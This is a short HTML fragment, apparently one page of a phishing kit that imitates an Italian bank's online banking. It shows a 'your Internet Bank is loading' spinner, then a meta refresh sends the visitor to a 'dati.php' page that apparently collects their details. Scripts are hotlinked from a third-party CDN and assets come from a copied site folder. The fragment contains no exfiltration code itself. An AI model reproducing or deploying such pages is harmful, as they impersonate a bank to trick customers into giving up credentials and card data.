<meta http-equiv="refresh" content="5; URL=dati.php">
<script src="https://prdbellweb.hs.llnwd.net/framework/js/jquery.js?ver=201406220823" type="text/javascript"></script>
<script src="https://prdbellweb.hs.llnwd.net/framework/js/jquery.unobtrusive-ajax.min.js?ver=201406220823" type="text/javascript"></script>

<style>
    .AjaxLoader {
        background-image: url("./Uni_files/blue-spinner.gif");
        background-position: 5px 5px;
        position: absolute;
        background-repeat: no-repeat;
        margin: 20px auto;
        padding: 15px 10px 15px 50px;
        top: 35%;
        left: 30%;
        height: 50%;
        width: 50%;
        overflow: hidden;
    }
</style>



<div id='ShowLoader' class="AjaxLoader" ><div class="header4" style="margin-top: 20px;font-size: 24px; margin-top: 20px; text-align: left;">La tua Banca via Internet è in caricamento.</div>
    </div>
</form>
